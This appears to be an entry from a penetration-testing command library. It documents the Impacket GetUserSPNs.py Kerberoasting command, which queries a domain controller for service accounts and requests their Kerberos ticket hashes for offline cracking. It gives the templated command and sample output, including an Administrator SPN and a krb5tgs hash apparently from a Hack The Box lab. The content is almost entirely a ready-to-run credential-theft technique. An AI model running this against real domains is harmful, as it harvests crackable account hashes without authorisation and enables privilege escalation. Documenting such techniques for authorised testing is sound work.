---
id: cfe8a48e-084c-42b7-b6b5-b66fba573639
name: GetUserSPN.py Query Domain for SPNs and Dump Available Hashes
type: command
executor: bash
data: GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_DOMAIN_IP -request
output: "root@kali:~/# GetUserSPNs.py 'host.domain/DomainUser:secretpassword' -dc-ip\
  \ 10.10.10.10\n -request\nImpacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation\n\
  \nServicePrincipalName  Name           MemberOf                                \
  \                  PasswordLa\nstSet             LastLogon                  \n--------------------\
  \  -------------  --------------------------------------------------------  --------------------------\
  \  --------------------------\nhost/CIFS:445       Administrator  CN=Group Policy\
  \ Creator Owners,CN=Users,DC=host,DC=domain  2018-07-18 15:06:40.351723  2018-07-30\
  \ 13:17:40.656520 \n\n\n\n$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$16cb7e029ac0581d5e00cd9630b9e5b7$7f4883920991ce68d83d5352551ebef6430c8cf8060bc456c2d616e82d53df16ab9f3afcf0cc33e63be79d2dc34c7b14465ce0953eb1e283b35e92d90c407\n\
  ...\n..."
created_at: '2019-12-04T19:39:54.379187+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# GetUserSPN.py Query Domain for SPNs and Dump Available Hashes

```bash
GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_DOMAIN_IP -request
```

## Expected Output

```
root@kali:~/# GetUserSPNs.py 'host.domain/DomainUser:secretpassword' -dc-ip 10.10.10.10
 -request
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLa
stSet             LastLogon                  
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------
host/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=host,DC=domain  2018-07-18 15:06:40.351723  2018-07-30 13:17:40.656520 



$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$16cb7e029ac0581d5e00cd9630b9e5b7$7f4883920991ce68d83d5352551ebef6430c8cf8060bc456c2d616e82d53df16ab9f3afcf0cc33e63be79d2dc34c7b14465ce0953eb1e283b35e92d90c407
...
...
```


